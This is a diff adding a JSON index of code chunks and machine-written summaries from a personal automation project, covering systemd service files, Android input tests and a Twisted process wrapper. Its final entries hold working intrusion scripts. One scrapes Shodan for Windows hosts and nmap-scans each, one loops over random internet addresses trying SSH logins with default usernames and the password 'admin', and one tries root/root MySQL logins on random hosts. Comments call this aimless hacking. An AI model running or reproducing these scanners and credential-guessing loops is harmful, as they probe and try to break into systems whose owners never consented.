@@ -1,0 +1,530 @@
+{
+    "100": {
+        "file_id": 13,
+        "content": "[Unit]\nDescription=trivial_service\nWants=network.target\nAfter=syslog.target network-online.target\n[Service]\nType=simple\nExecStart=bash /root/AGI/metalazero/daemonize_startup/linux_systemd/discovery_service.sh\nRestart=on-failure\nRestartSec=10\nKillMode=process\n[Install]\nWantedBy=multi-user.target",
+        "type": "code",
+        "location": "/daemonize_startup/linux_systemd/discovery_service.service:1-15"
+    },
+    "101": {
+        "file_id": 13,
+        "content": "This code defines a Systemd unit file for a trivial service. It specifies dependencies, startup order, execution script, and restart settings. The service is marked as \"simple\" type and will be wanted by the \"multi-user.target\".",
+        "type": "comment"
+    },
+    "102": {
+        "file_id": 14,
+        "content": "/daemonize_startup/linux_systemd/frp_service.service",
+        "type": "filepath"
+    },
+    "103": {
+        "file_id": 14,
+        "content": "This code configures a Systemd unit file for a trivial service called \"trivial_service\". It specifies dependencies like network.target and syslog.target, and sets the ExecStart to run a bash script \"/root/AGI/metalazero/daemonize_startup/linux_systemd/frp_service.sh\". The service will restart on failure with a 10-second delay and will be installed to start at multi-user.target.",
+        "type": "summary"
+    },
+    "104": {
+        "file_id": 14,
+        "content": "[Unit]\nDescription=trivial_service\nWants=network.target\nAfter=syslog.target network-online.target\n[Service]\nType=simple\nExecStart=bash /root/AGI/metalazero/daemonize_startup/linux_systemd/frp_service.sh\nRestart=on-failure\nRestartSec=10\nKillMode=process\n[Install]\nWantedBy=multi-user.target",
+        "type": "code",
+        "location": "/daemonize_startup/linux_systemd/frp_service.service:1-15"
+    },
+    "105": {
+        "file_id": 14,
+        "content": "This code configures a Systemd unit file for a trivial service called \"trivial_service\". It specifies dependencies like network.target and syslog.target, and sets the ExecStart to run a bash script \"/root/AGI/metalazero/daemonize_startup/linux_systemd/frp_service.sh\". The service will restart on failure with a 10-second delay and will be installed to start at multi-user.target.",
+        "type": "comment"
+    },
+    "106": {
+        "file_id": 15,
+        "content": "/daemonize_startup/linux_systemd/jupyter_service.service",
+        "type": "filepath"
+    },
+    "107": {
+        "file_id": 15,
+        "content": "This code is for creating a SystemD service unit file for the \"trivial_service\". It specifies dependencies, startup order, and restart settings. The service runs a simple command (bash script) and is intended to be wanted by multi-user target.",
+        "type": "summary"
+    },
+    "108": {
+        "file_id": 15,
+        "content": "[Unit]\nDescription=trivial_service\nWants=network.target\nAfter=syslog.target network-online.target\n[Service]\nType=simple\nExecStart=bash /root/AGI/metalazero/daemonize_startup/linux_systemd/jupyter_service.sh\nRestart=on-failure\nRestartSec=10\nKillMode=process\n[Install]\nWantedBy=multi-user.target",
+        "type": "code",
+        "location": "/daemonize_startup/linux_systemd/jupyter_service.service:1-15"
+    },
+    "109": {
+        "file_id": 15,
+        "content": "This code is for creating a SystemD service unit file for the \"trivial_service\". It specifies dependencies, startup order, and restart settings. The service runs a simple command (bash script) and is intended to be wanted by multi-user target.",
+        "type": "comment"
+    },
+    "110": {
+        "file_id": 16,
+        "content": "/daemonize_startup/linux_systemd/novnc_service.service",
+        "type": "filepath"
+    },
+    "111": {
+        "file_id": 16,
+        "content": "This service file defines a trivial systemd service called \"trivial_service\", which depends on network connectivity and relies on syslog for logging. It executes a bash script located at /root/AGI/metalazero/daemonize_startup/linux_systemd/novnc_service.sh as its main process, and will automatically restart if it fails with a delay of 10 seconds between restarts. The service is intended to be part of the multi-user target configuration.",
+        "type": "summary"
+    },
+    "112": {
+        "file_id": 16,
+        "content": "[Unit]\nDescription=trivial_service\nWants=network.target\nAfter=syslog.target network-online.target\n[Service]\nType=simple\nExecStart=bash /root/AGI/metalazero/daemonize_startup/linux_systemd/novnc_service.sh\nRestart=on-failure\nRestartSec=10\nKillMode=process\n[Install]\nWantedBy=multi-user.target",
+        "type": "code",
+        "location": "/daemonize_startup/linux_systemd/novnc_service.service:1-15"
+    },
+    "113": {
+        "file_id": 16,
+        "content": "This service file defines a trivial systemd service called \"trivial_service\", which depends on network connectivity and relies on syslog for logging. It executes a bash script located at /root/AGI/metalazero/daemonize_startup/linux_systemd/novnc_service.sh as its main process, and will automatically restart if it fails with a delay of 10 seconds between restarts. The service is intended to be part of the multi-user target configuration.",
+        "type": "comment"
+    },
+    "114": {
+        "file_id": 17,
+        "content": "/daemonize_startup/linux_systemd/render_install_service.py",
+        "type": "filepath"
+    },
+    "115": {
+        "file_id": 17,
+        "content": "This code parses arguments, creates a Jinja2 template, renders it with data, and saves as a .service file. It derives service description and script from command-line inputs and optionally executes a bash script.",
+        "type": "summary"
+    },
+    "116": {
+        "file_id": 17,
+        "content": "import jinja2\nimport os\nimport argparse\nparser = argparse.ArgumentParser()\nparser.add_argument(\"-d\",\"--description\",type=str,default=\"trivial_service\")\nparser.add_argument(\"-s\",\"--script\",type=str,required=True)\nparser.add_argument(\"-n\",\"--name\",type=str,required=True)\nparser.add_argument(\"-e\",\"--execute\",action=\"store_true\")\nargs = parser.parse_args()\nexecute = args.execute\ndesc = args.description\nscript = args.script\nname = args.name\ndef get_template(file_name):\n    with open(file_name,\"r\") as f:\n        content = f.read()\n        template = jinja2.Template(content)\n        return template\ndef render_template(file_name,dic):\n    return get_template(file_name).render(dic)\ndef save_render_template(file_name, data, outfile):\n    with open(outfile,\"w+\") as f:\n        f.write(render_template(file_name, data))\nif __name__ == \"__main__\":\n    service_file = name + \".service\"\n    execute_script_file = \"script.sh\"\n    save_render_template(\"template.j2\", {\"service_description\": desc, \"service_script\": script}, service_file)",
+        "type": "code",
+        "location": "/daemonize_startup/linux_systemd/render_install_service.py:1-33"
+    },
+    "117": {
+        "file_id": 17,
+        "content": "This code parses arguments, creates a template using Jinja2, renders the template with provided data, and saves it as a .service file. The service description and script are derived from command-line inputs.",
+        "type": "comment"
+    },
+    "118": {
+        "file_id": 17,
+        "content": "    save_render_template(\"routine.j2\", {\"service\": name, \"service_file\": service_file}, execute_script_file)\n    if execute:\n        os.system(\"bash {}\".format(execute_script_file))",
+        "type": "code",
+        "location": "/daemonize_startup/linux_systemd/render_install_service.py:34-36"
+    },
+    "119": {
+        "file_id": 17,
+        "content": "This code saves a rendered template called \"routine.j2\" with the service name and file path, and then executes a bash script if the \"execute\" variable is set.",
+        "type": "comment"
+    },
+    "120": {
+        "file_id": 18,
+        "content": "/daemonize_startup/linux_systemd/routine.j2",
+        "type": "filepath"
+    },
+    "121": {
+        "file_id": 18,
+        "content": "This code renders as bash scripts and performs the following actions: copies a service file to /etc/systemd/system, reloads systemd daemon configuration, stops (kills) the specific service, starts the service, and enables it to automatically start on boot.",
+        "type": "summary"
+    },
+    "122": {
+        "file_id": 18,
+        "content": "# ought to be rendered as bash scripts.\nsudo cp {{ service_file }} /etc/systemd/system/{{ service_file }}\nsudo systemctl daemon-reload\nsudo systemctl kill {{ service }}\nsudo systemctl start {{ service }}\nsudo systemctl enable {{ service }} ",
+        "type": "code",
+        "location": "/daemonize_startup/linux_systemd/routine.j2:1-6"
+    },
+    "123": {
+        "file_id": 18,
+        "content": "This code renders as bash scripts and performs the following actions: copies a service file to /etc/systemd/system, reloads systemd daemon configuration, stops (kills) the specific service, starts the service, and enables it to automatically start on boot.",
+        "type": "comment"
+    },
+    "124": {
+        "file_id": 19,
+        "content": "/daemonize_startup/linux_systemd/script.sh",
+        "type": "filepath"
+    },
+    "125": {
+        "file_id": 19,
+        "content": "This code copies the \"novnc_service.service\" file to the systemd directory, reloads the daemon, stops and starts the \"novnc_service\", and enables it for automatic startup on Linux systemd-based systems.",
+        "type": "summary"
+    },
+    "126": {
+        "file_id": 19,
+        "content": "# ought to be rendered as bash scripts.\nsudo cp novnc_service.service /etc/systemd/system/novnc_service.service\nsudo systemctl daemon-reload\nsudo systemctl kill novnc_service\nsudo systemctl start novnc_service\nsudo systemctl enable novnc_service ",
+        "type": "code",
+        "location": "/daemonize_startup/linux_systemd/script.sh:1-6"
+    },
+    "127": {
+        "file_id": 19,
+        "content": "This code copies the \"novnc_service.service\" file to the systemd directory, reloads the daemon, stops and starts the \"novnc_service\", and enables it for automatic startup on Linux systemd-based systems.",
+        "type": "comment"
+    },
+    "128": {
+        "file_id": 20,
+        "content": "/daemonize_startup/linux_systemd/template.j2",
+        "type": "filepath"
+    },
+    "129": {
+        "file_id": 20,
+        "content": "This code sets up a Systemd unit file for a simple service on Linux. It specifies the description, dependencies, startup type and script, restart behavior, and desired runlevels. The service will start automatically after network is available and logged events are stored in syslog.",
+        "type": "summary"
+    },
+    "130": {
+        "file_id": 20,
+        "content": "[Unit]\nDescription={{ service_description }}\nWants=network.target\nAfter=syslog.target network-online.target\n[Service]\nType=simple\nExecStart={{ service_script }}\nRestart=on-failure\nRestartSec=10\nKillMode=process\n[Install]\nWantedBy=multi-user.target",
+        "type": "code",
+        "location": "/daemonize_startup/linux_systemd/template.j2:1-15"
+    },
+    "131": {
+        "file_id": 20,
+        "content": "This code sets up a Systemd unit file for a simple service on Linux. It specifies the description, dependencies, startup type and script, restart behavior, and desired runlevels. The service will start automatically after network is available and logged events are stored in syslog.",
+        "type": "comment"
+    },
+    "132": {
+        "file_id": 21,
+        "content": "/daemonize_startup/linux_systemd/wifimouse_service.service",
+        "type": "filepath"
+    },
+    "133": {
+        "file_id": 21,
+        "content": "This code defines a Systemd service unit file for a trivial service, specifying dependencies, execution commands, and restart options. The service is set to run after network connectivity and uses syslog for logging. It executes a bash script and will automatically restart upon failure with a 10-second delay. It is configured to be wanted by the multi-user target.",
+        "type": "summary"
+    },
+    "134": {
+        "file_id": 21,
+        "content": "[Unit]\nDescription=trivial_service\nWants=network.target\nAfter=syslog.target network-online.target\n[Service]\nType=simple\nExecStart=bash /root/AGI/metalazero/daemonize_startup/linux_systemd/wifimouse_service.sh\nRestart=on-failure\nRestartSec=10\nKillMode=process\n[Install]\nWantedBy=multi-user.target",
+        "type": "code",
+        "location": "/daemonize_startup/linux_systemd/wifimouse_service.service:1-15"
+    },
+    "135": {
+        "file_id": 21,
+        "content": "This code defines a Systemd service unit file for a trivial service, specifying dependencies, execution commands, and restart options. The service is set to run after network connectivity and uses syslog for logging. It executes a bash script and will automatically restart upon failure with a 10-second delay. It is configured to be wanted by the multi-user target.",
+        "type": "comment"
+    },
+    "136": {
+        "file_id": 22,
+        "content": "/daemonize_startup/linux_systemd/x11vnc_service.service",
+        "type": "filepath"
+    },
+    "137": {
+        "file_id": 22,
+        "content": "This code configures a Systemd service for a trivial service named \"trivial_service\". It depends on the network and requires syslog and network-online.target to be activated beforehand. The service uses a simple type, executes a bash script, and restarts on failure with a 10 second delay. It is installed as wanted by multi-user.target.",
+        "type": "summary"
+    },
+    "138": {
+        "file_id": 22,
+        "content": "[Unit]\nDescription=trivial_service\nWants=network.target\nAfter=syslog.target network-online.target\n[Service]\nType=simple\nExecStart=bash /root/AGI/metalazero/daemonize_startup/linux_systemd/x11vnc_service.sh\nRestart=on-failure\nRestartSec=10\nKillMode=process\n[Install]\nWantedBy=multi-user.target",
+        "type": "code",
+        "location": "/daemonize_startup/linux_systemd/x11vnc_service.service:1-15"
+    },
+    "139": {
+        "file_id": 22,
+        "content": "This code configures a Systemd service for a trivial service named \"trivial_service\". It depends on the network and requires syslog and network-online.target to be activated beforehand. The service uses a simple type, executes a bash script, and restarts on failure with a 10 second delay. It is installed as wanted by multi-user.target.",
+        "type": "comment"
+    },
+    "140": {
+        "file_id": 23,
+        "content": "/native/lazero_android_aarch64/inputService/autojs_type_test.js",
+        "type": "filepath"
+    },
+    "141": {
+        "file_id": 23,
+        "content": "This code initializes a function 'fun' that outputs \"123\" and sets an interval of 1000 milliseconds. It continuously executes the 'fun' function every 1000 ms until the program exits, expressing frustration with AutoJS due to its instability or issues.",
+        "type": "summary"
+    },
+    "142": {
+        "file_id": 23,
+        "content": "// this is rhino.\nfun=()=>{Text(\"123\");};\nitv=1000;\nsetInterval(fun,itv);\n// exiting all the time. autojs sucks.",
+        "type": "code",
+        "location": "/native/lazero_android_aarch64/inputService/autojs_type_test.js:1-5"
+    },
+    "143": {
+        "file_id": 23,
+        "content": "This code initializes a function 'fun' that outputs \"123\" and sets an interval of 1000 milliseconds. It continuously executes the 'fun' function every 1000 ms until the program exits, expressing frustration with AutoJS due to its instability or issues.",
+        "type": "comment"
+    },
+    "144": {
+        "file_id": 24,
+        "content": "/native/lazero_android_aarch64/inputService/twisted_type_test.py",
+        "type": "filepath"
+    },
+    "145": {
+        "file_id": 24,
+        "content": "Imports necessary modules, sets system path, initializes a TwistedProcess instance with the command \"su\", then writes input text \"123\" 5 times after a delay, and prints the read output.",
+        "type": "summary"
+    },
+    "146": {
+        "file_id": 24,
+        "content": "import sys\nsys.path.append(\"../tools\")\nfrom twisted_template import TwistedProcess as TP\ncmd=\"su\"\nimport time\nwait=lambda:time.sleep(1)\ntp=TP([cmd])\nfor _ in range(5):\n    tp.write(b'input text \"123\"\\n')\n    wait()\n    print(tp.read(blocking=False))",
+        "type": "code",
+        "location": "/native/lazero_android_aarch64/inputService/twisted_type_test.py:1-15"
+    },
+    "147": {
+        "file_id": 24,
+        "content": "Imports necessary modules, sets system path, initializes a TwistedProcess instance with the command \"su\", then writes input text \"123\" 5 times after a delay, and prints the read output.",
+        "type": "comment"
+    },
+    "148": {
+        "file_id": 25,
+        "content": "/native/lazero_android_aarch64/inputService/type_test.py",
+        "type": "filepath"
+    },
+    "149": {
+        "file_id": 25,
+        "content": "Executing a \"su\" command using subprocess module and sending input text \"123\". Communicating with the process and capturing output and error messages.",
+        "type": "summary"
+    },
+    "150": {
+        "file_id": 25,
+        "content": "from subprocess import Popen, PIPE\ncmd=\"su\"\np=Popen([cmd],stdin=PIPE,stdout=PIPE,stderr=PIPE)\n# print(dir(p.stdin))\n# use communicate\n#for _ in range(3):\nout,err= p.communicate(input='input text \"123\"'.encode(\"utf-8\"))\nprint(out,err)",
+        "type": "code",
+        "location": "/native/lazero_android_aarch64/inputService/type_test.py:1-9"
+    },
+    "151": {
+        "file_id": 25,
+        "content": "Executing a \"su\" command using subprocess module and sending input text \"123\". Communicating with the process and capturing output and error messages.",
+        "type": "comment"
+    },
+    "152": {
+        "file_id": 26,
+        "content": "/native/lazero_android_aarch64/inputService/type_test.sh",
+        "type": "filepath"
+    },
+    "153": {
+        "file_id": 26,
+        "content": "This code switches to the superuser mode (su) and inputs the text \"123\" using MagiskSU, a popular Android superuser management tool.",
+        "type": "summary"
+    },
+    "154": {
+        "file_id": 26,
+        "content": "su -c 'input text \"123\"'\n# this is MagiskSU.",
+        "type": "code",
+        "location": "/native/lazero_android_aarch64/inputService/type_test.sh:1-2"
+    },
+    "155": {
+        "file_id": 26,
+        "content": "This code switches to the superuser mode (su) and inputs the text \"123\" using MagiskSU, a popular Android superuser management tool.",
+        "type": "comment"
+    },
+    "156": {
+        "file_id": 27,
+        "content": "/native/lazero_android_aarch64/mkdirs.sh",
+        "type": "filepath"
+    },
+    "157": {
+        "file_id": 27,
+        "content": "Creates directories for various services and components within the project.",
+        "type": "summary"
+    },
+    "158": {
+        "file_id": 27,
+        "content": "#!/usr/bin/fish\nmkdir {browserService, eventService, virtualService, shellService, inputService, cognitionService, configClass, tools, replService, mainService, backupService, floatwindow, shareService, init}\ncd virtualService\nmkdir {shellService, inputService, eventService, tools, replService}",
+        "type": "code",
+        "location": "/native/lazero_android_aarch64/mkdirs.sh:1-4"
+    },
+    "159": {
+        "file_id": 27,
+        "content": "Creates directories for various services and components within the project.",
+        "type": "comment"
+    },
+    "160": {
+        "file_id": 28,
+        "content": "/native/lazero_android_aarch64/tools/twisted_template.py",
+        "type": "filepath"
+    },
+    "161": {
+        "file_id": 28,
+        "content": "This code creates 'Reader' and 'MyPP' classes for buffering, event handling, and protocol extension on Windows. It spawns processes with threaded communication and allows data exchange and subprocess control, functioning as part of a process management system that stops the reactor and checks if the process has ended.",
+        "type": "summary"
+    },
+    "162": {
+        "file_id": 28,
+        "content": "from twisted.internet import protocol, reactor\nimport time\n# import sys\nimport threading\n# password is a must here. not kidding.\nimport os\ndef isWINDOWS():\n    return os.name == \"nt\"\nclass Reader:\n    def __init__(self):\n        self.event = threading.Event()\n        self.event.clear()\n        self.buffer = bytearray(b'')\n    def clear(self):\n        self.event.clear()\n    def set(self):\n        self.event.set()\n    def write(self,_bytes,blocking=True):\n        assert type(_bytes) == bytes\n        if blocking:\n            if len(_bytes) == 0:\n                return\n        self.buffer.extend(_bytes)\n        self.event.set()\n    def read(self,blocking=True):\n        if blocking:\n            self.event.wait()\n            self.event.clear()\n        _bytes = bytes(self.buffer)\n        self.buffer.clear()\n        return _bytes\n    def clear(self):\n        self.buffer.clear()\nclass MyPP(protocol.ProcessProtocol):\n    def __init__(self,reader):\n        super().__init__()\n        self.reader = reader\n    def connectionMade(self):\n        CM = lambda: print(\"\\n[Connection Made]\\n\")",
+        "type": "code",
+        "location": "/native/lazero_android_aarch64/tools/twisted_template.py:1-43"
+    },
+    "163": {
+        "file_id": 28,
+        "content": "The code defines a class 'Reader' for handling data buffering and events, and another class 'MyPP' as a protocol extension for communicating with a process. It uses threading, event handling, and byte manipulation.",
+        "type": "comment"
+    },
+    "164": {
+        "file_id": 28,
+        "content": "        CM()\n        # reactor.callLater(1.0, CM)\n    def write(self, a):\n        # binary.\n        assert type(a) == bytes\n        self.transport.write(a)\n    def processExited(self, reason):\n        print(\"processExited, status %s\" % (reason.value.exitCode,))\n    def outReceived(self, data):\n        self.reader.write(data)\n    def errReceived(self, data):\n        self.reader.write(data)\nimport sys\n#sys.path.append(\"..\\\\tools\")\nfrom where import where\nclass TwistedProcess:\n    # def __init__(self,command=[\"cmd.exe\"],usePTY=True):\n    def __init__(self,command=[\"cmd\"],usePTY=True,env=dict(os.environ), path=None,autolocate=True):\n        assert type(command) == list and len(command)>0\n        if isWINDOWS():\n            print(\"System is Windows. Forced to use non-PTY mode.\")\n            usePTY = False\n    # how to kill this process?\n        reader = Reader()\n        self.reader = reader\n        pp = MyPP(reader)\n        def theFunc(a):\n            try:\n                a.run()\n            except:\n                pass\n        # process = reactor.spawnProcess(pp, command[0], command, usePTY=usePTY)",
+        "type": "code",
+        "location": "/native/lazero_android_aarch64/tools/twisted_template.py:44-82"
+    },
+    "165": {
+        "file_id": 28,
+        "content": "This code defines a TwistedProcess class that spawns a new process using the Twisted library, with optional command, usePTY, env variables and path settings. It also creates a reader object to receive output and handles process exit status. The class is designed for Windows platforms and forces non-PTY mode if it detects the system as Windows.",
+        "type": "comment"
+    },
+    "166": {
+        "file_id": 28,
+        "content": "        executable = command[0]\n        if autolocate:\n            if not os.path.isabs(executable):\n                executable = where(executable)[0]\n        process = reactor.spawnProcess(pp, executable, command, env=env, path=path, usePTY=usePTY)\n        # print(dir(process))\n        # ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__implemented__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__providedBy__', '__provides__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_addPollableResource', '_callProcessExited', '_checkPollingState', '_currentTimeout', '_getReason', '_pause', '_paused', '_pollEvent', '_pollTimer', '_reschedule', '_resources', '_startPolling', '_stopPolling', '_unpause', 'closeChildFD', 'closeStderr', 'closeStdin', 'closeStdout', 'closedNotifies', 'connectionLostN",
+        "type": "code",
+        "location": "/native/lazero_android_aarch64/tools/twisted_template.py:83-89"
+    },
+    "167": {
+        "file_id": 28,
+        "content": "This code is creating a process by spawning it with the given executable and command. If autolocate is enabled, it checks if the executable path is absolute and if not, uses \"where\" to find its location. The process is then spawned using reactor's \"spawnProcess\" method with provided environment, path, and usePTY options. Finally, some attributes of the created process are printed to the console.",
+        "type": "comment"
+    },
+    "168": {
+        "file_id": 28,
+        "content": "otify', 'errConnectionLost', 'hProcess', 'hStderrR', 'hStdinW', 'hStdoutR', 'hThread', 'inConnectionLost', 'loseConnection', 'lostProcess', 'maybeCallProcessEnded', 'outConnectionLost', 'pauseProducing', 'pid', 'processEnded', 'proto', 'reactor', 'registerProducer', 'resumeProducing', 'signalProcess', 'status', 'stderr', 'stdin', 'stdout', 'stopProducing', 'unregisterProducer', 'write', 'writeSequence', 'writeToChild']\n        self.process=process\n        self.pp = pp\n        p = threading.Thread(target=theFunc,args=(reactor,)) # pause the reactor?\n        p.setDaemon(True)\n        p.start() # not RUN!\n    def write(self,text):\n        assert type(text) == bytes\n        self.pp.write(text)\n    def read(self,blocking=True):\n        return self.reader.read(blocking=blocking)\n    def terminate(self):\n        # usually not reusable. all will be deleted.\n        self.reader.clear()\n        pid = self.process.pid\n        # try:\n        #     self.process.closeStderr()\n        #     self.process.closeStdin()\n        #     self.process.closeStdout()",
+        "type": "code",
+        "location": "/native/lazero_android_aarch64/tools/twisted_template.py:89-107"
+    },
+    "169": {
+        "file_id": 28,
+        "content": "This code sets up a thread to manage communication with a subprocess, allowing for asynchronous interaction by pausing and resuming the reactor, writing data to the process's stdin, and reading from its stdout. The terminate function clears the reader and closes stdin, stderr, and stdout before the process is terminated.",
+        "type": "comment"
+    },
+    "170": {
+        "file_id": 28,
+        "content": "        #     # reactor.stop()\n        # except:\n        #     pass\n        return pid\n    def isalive(self):\n        return self.process.processEnded",
+        "type": "code",
+        "location": "/native/lazero_android_aarch64/tools/twisted_template.py:108-113"
+    },
+    "171": {
+        "file_id": 28,
+        "content": "This code snippet appears to be part of a process management system. It attempts to stop the reactor, and if an exception occurs during this process, it ignores it and returns the PID (Process ID). The 'isalive' function checks whether the process has ended or not.",
+        "type": "comment"
+    },
+    "172": {
+        "file_id": 29,
+        "content": "/native/lazero_android_aarch64/tools/where.py",
+        "type": "filepath"
+    },
+    "173": {
+        "file_id": 29,
+        "content": "This code imports the subprocess module and defines a function called \"where\" that takes a target as input. It runs the \"which\" command on the given target, filters out empty strings, and returns the non-empty results as a list. This function can be used to find the location of executable files in the system path.",
+        "type": "summary"
+    },
+    "174": {
+        "file_id": 29,
+        "content": "# import subprocess\nfrom subprocess import Popen, PIPE\ndef where(target):\n    p = Popen([\"which\",target],stderr=PIPE,stdout=PIPE)\n    p = p.communicate()[0].decode(\"utf-8\") # bytes.\n    p0 = p.split(\"\\n\")\n    p0 = [x.replace(\"\\n\", \"\").replace(\"\\r\",\"\") for x in p0]\n    p0 = list(filter(lambda x:len(x)>0,p0))\n    return p0",
+        "type": "code",
+        "location": "/native/lazero_android_aarch64/tools/where.py:1-10"
+    },
+    "175": {
+        "file_id": 29,
+        "content": "This code imports the subprocess module and defines a function called \"where\" that takes a target as input. It runs the \"which\" command on the given target, filters out empty strings, and returns the non-empty results as a list. This function can be used to find the location of executable files in the system path.",
+        "type": "comment"
+    },
+    "176": {
+        "file_id": 30,
+        "content": "/native/lazero_chromeos_aarch64/cognitionService/check_attribute.py",
+        "type": "filepath"
+    },
+    "177": {
+        "file_id": 30,
+        "content": "Imports argparse module, extracts attribute names containing \"parse\" from the dir of ArgumentParser class.",
+        "type": "summary"
+    },
+    "178": {
+        "file_id": 30,
+        "content": "import argparse\nnames = dir(argparse.ArgumentParser())\nprint([x for x in names if \"parse\" in x])",
+        "type": "code",
+        "location": "/native/lazero_chromeos_aarch64/cognitionService/check_attribute.py:1-3"
+    },
+    "179": {
+        "file_id": 30,
+        "content": "Imports argparse module, extracts attribute names containing \"parse\" from the dir of ArgumentParser class.",
+        "type": "comment"
+    },
+    "180": {
+        "file_id": 31,
+        "content": "/native/lazero_chromeos_aarch64/cognitionService/get_commands.sh",
+        "type": "filepath"
+    },
+    "181": {
+        "file_id": 31,
+        "content": "Executing a Bash script, initializing autocompletion options for arguments 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'j', 'k', 's', 'u', and 'v'.",
+        "type": "summary"
+    },
+    "182": {
+        "file_id": 31,
+        "content": "#!/bin/bash\ncompgen -abcdefgjksuv",
+        "type": "code",
+        "location": "/native/lazero_chromeos_aarch64/cognitionService/get_commands.sh:1-2"
+    },
+    "183": {
+        "file_id": 31,
+        "content": "Executing a Bash script, initializing autocompletion options for arguments 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'j', 'k', 's', 'u', and 'v'.",
+        "type": "comment"
+    },
+    "184": {
+        "file_id": 32,
+        "content": "/native/lazero_chromeos_aarch64/cognitionService/get_targets.sh",
+        "type": "filepath"
+    },
+    "185": {
+        "file_id": 32,
+        "content": "The script retrieves a list of Windows IP addresses from Shodan by searching for them, extracts the IP addresses using regular expressions, and then feeds those IPs to a Python script called \"hacking_service.py\". The Python script likely performs some form of attack or scan against the discovered Windows systems.",
+        "type": "summary"
+    },
+    "186": {
+        "file_id": 32,
+        "content": "#!/bin/bash\nlinks -dump https://shodan.io/search?query=windows | grep -Eo \"[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+\" | xargs -iabc python3 hacking_service.py -d abc",
+        "type": "code",
+        "location": "/native/lazero_chromeos_aarch64/cognitionService/get_targets.sh:1-2"
+    },
+    "187": {
+        "file_id": 32,
+        "content": "The script retrieves a list of Windows IP addresses from Shodan by searching for them, extracts the IP addresses using regular expressions, and then feeds those IPs to a Python script called \"hacking_service.py\". The Python script likely performs some form of attack or scan against the discovered Windows systems.",
+        "type": "comment"
+    },
+    "188": {
+        "file_id": 33,
+        "content": "/native/lazero_chromeos_aarch64/cognitionService/hacking_service.py",
+        "type": "filepath"
+    },
+    "189": {
+        "file_id": 33,
+        "content": "The code imports os and argparse modules, sets default address as \"127.0.0.1\", defines a command lambda function, parses command line arguments using parser.parse_args(), then runs the nmap scan with the specified address via os.system().",
+        "type": "summary"
+    },
+    "190": {
+        "file_id": 33,
+        "content": "import os\n# just use plain nmap scanning.\nimport argparse\nparser = argparse.ArgumentParser()\nparser.add_argument(\"-d\",\"--address\",type=str,default=\"127.0.0.1\",help=\"address to check\")\ncmd = lambda ip: \"nmap {}\".format(ip)\nargs = parser.parse_args()\nos.system(cmd(args.address))",
+        "type": "code",
+        "location": "/native/lazero_chromeos_aarch64/cognitionService/hacking_service.py:1-8"
+    },
+    "191": {
+        "file_id": 33,
+        "content": "The code imports os and argparse modules, sets default address as \"127.0.0.1\", defines a command lambda function, parses command line arguments using parser.parse_args(), then runs the nmap scan with the specified address via os.system().",
+        "type": "comment"
+    },
+    "192": {
+        "file_id": 34,
+        "content": "/native/lazero_chromeos_aarch64/cognitionService/mysql_randomly.py",
+        "type": "filepath"
+    },
+    "193": {
+        "file_id": 34,
+        "content": "This code imports the pymysql library and connects to a MySQL database using SSH randomly generated IP addresses. It checks if the connection is successful and prints the IP address if connected.",
+        "type": "summary"
+    },
+    "194": {
+        "file_id": 34,
+        "content": "import pymysql\nfrom ssh_randomly import *\nuser = \"root\"\npassword = \"root\"\ndbname = \"users\"\nif __name__ == \"__main__\":\n    ip = get_ip()\n    while True:\n        try:\n            db = pymysql.connect(host=ip,user=user,password=password,database=dbname,connect_timeout=3)\n            print(\"connected?\",ip)\n        except:\n            import traceback\n            traceback.print_exc()",
+        "type": "code",
+        "location": "/native/lazero_chromeos_aarch64/cognitionService/mysql_randomly.py:1-14"
+    },
+    "195": {
+        "file_id": 34,
+        "content": "This code imports the pymysql library and connects to a MySQL database using SSH randomly generated IP addresses. It checks if the connection is successful and prints the IP address if connected.",
+        "type": "comment"
+    },
+    "196": {
+        "file_id": 35,
+        "content": "/native/lazero_chromeos_aarch64/cognitionService/ssh_randomly.py",
+        "type": "filepath"
+    },
+    "197": {
+        "file_id": 35,
+        "content": "The code randomly selects a user and an IP address within the range of 0 to 255 for each iteration. It then uses SSH (Secure Shell) to connect to the specified IP address using the 'sshpass' tool with a hardcoded password \"admin\". The command is executed using 'os.system()'. The purpose seems to be randomly attempting SSH connections across the network without any specific objective or knowledge about the target systems.",
+        "type": "summary"
+    },
+    "198": {
+        "file_id": 35,
+        "content": "import os\ncmd = lambda user,ip: \"sshpass -p \\\"admin\\\" ssh -o ConnectTimeout=3 -o BatchMode=yes -o StrictHostKeyChecking=no {}@{}\".format(user,ip)\n# this time we do not know shit about this fucking shit.\n# we are just aimlessly hacking around the fucking internet.\n# does not mean anything interesting.\nimport random\ndef get_ip():\n    mp = lambda: str(random.randint(0,255))\n    address = \".\".join([mp() for x in range(4)])\n    return address\nif __name__ == \"__main__\":\n    while True:\n        address = get_ip()\n        user = random.choice((\"administrator\",\"root\",\"test\",\"guest\"))\n        command = cmd(user,address)\n        os.system(command)",
+        "type": "code",
+        "location": "/native/lazero_chromeos_aarch64/cognitionService/ssh_randomly.py:1-17"
+    },
+    "199": {
+        "file_id": 35,
+        "content": "The code randomly selects a user and an IP address within the range of 0 to 255 for each iteration. It then uses SSH (Secure Shell) to connect to the specified IP address using the 'sshpass' tool with a hardcoded password \"admin\". The command is executed using 'os.system()'. The purpose seems to be randomly attempting SSH connections across the network without any specific objective or knowledge about the target systems.",
+        "type": "comment"
+    }
+}
